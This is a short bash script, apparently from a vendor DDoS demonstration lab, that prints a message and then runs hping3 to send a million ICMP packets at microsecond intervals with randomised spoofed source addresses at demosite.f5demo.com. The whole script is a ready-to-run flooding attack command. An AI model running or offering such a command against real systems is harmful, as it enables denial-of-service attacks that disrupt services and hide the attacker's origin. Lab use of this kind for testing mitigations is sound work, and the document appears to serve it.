#!/bin/bash
echo "Starting ICMP Flood:  hping3 -c 1000000 --icmp -i u5 demosite.f5demo.com"
hping3 -I eth1 --c 1000000 --icmp -i u5 --rand-source demosite.f5demo.com
